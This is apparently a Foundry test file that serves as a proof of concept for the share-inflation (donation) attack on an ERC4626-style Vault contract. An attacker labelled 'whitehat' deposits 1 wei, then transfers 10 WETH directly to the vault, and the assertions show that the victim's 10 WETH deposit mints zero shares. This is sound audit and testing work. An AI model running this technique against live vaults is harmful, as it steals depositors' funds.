// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Metadata} from "../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import {IWETH} from "../src/interfaces/IWETH.sol";
import {Vault} from "../src/Vault.sol";

contract VaultTest is Test {
    Vault private vault;
    IERC20Metadata public weth = IERC20Metadata(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    address wethWhale = 0x2F0b23f53734252Bda2277357e97e1517d6B042A;

    address victim = 0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5; 
    address whitehat = address(12321);

    uint256 victimDeposit = 10 ether;
    uint256 inflationAmount = 10 ether;

    function setUp() public {
        vault = new Vault(IERC20Metadata(weth));

        vm.deal(victim, 100 ether);
        vm.deal(whitehat, 100 ether);

        vm.startPrank(victim);
        weth.approve(address(vault), type(uint256).max);
        IWETH(address(weth)).deposit{value: 100 ether}();
        vm.stopPrank();
        vm.startPrank(whitehat);
        weth.approve(address(vault), type(uint256).max);
        IWETH(address(weth)).deposit{value: 100 ether}();
    }

    function test() public {
        uint256 vaultBalanceStart = weth.balanceOf(address(vault));
        uint256 victimBalanceStart = weth.balanceOf(victim);
        uint256 whitehatBalanceStart = weth.balanceOf(whitehat);

        console2.log("vault balance start", vaultBalanceStart);
        console2.log("victim balance start", victimBalanceStart);
        console2.log("whitehat balance start", whitehatBalanceStart);

        vm.startPrank(whitehat);
        vault.deposit(1, whitehat);

        uint256 vaultBalanceAfterMint = weth.balanceOf(address(vault));

        assertEq(vaultBalanceAfterMint, 1);

        weth.transfer(address(vault), inflationAmount);

        uint256 vaultBalanceAfterTransfer = weth.balanceOf(address(vault));
        uint256 vaultTotalSupplyAfterTransfer = vault.totalSupply();

        console2.log("vault balance after transfer", vaultBalanceAfterTransfer);
        console2.log("vault total supply after transfer", vaultTotalSupplyAfterTransfer);
        console2.log("victim deposit");

        vm.startPrank(victim);
        vault.deposit(victimDeposit, victim);
        
        uint256 victimBalanceAfterDeposit = weth.balanceOf(victim);
        uint256 vaultBalanceAfterDeposit = weth.balanceOf(address(vault));
        uint256 vaultTotalSupplyAfterDeposit = vault.totalSupply();
        uint256 victimShares = vault.balanceOf(victim);
        uint256 whitehatShares = vault.balanceOf(whitehat);

        console2.log("victim balance after deposit", victimBalanceAfterDeposit);
        console2.log("vault balance after deposit", vaultBalanceAfterDeposit);
        console2.log("vault total supply after deposit", vaultTotalSupplyAfterDeposit);
        console2.log("victim shares", victimShares);
        console2.log("whitehat shares", whitehatShares);

        assertEq(victimShares, 0);
        assertEq(whitehatShares, 1);
        assertEq(vaultBalanceAfterDeposit, inflationAmount + victimDeposit + 1);
    }
}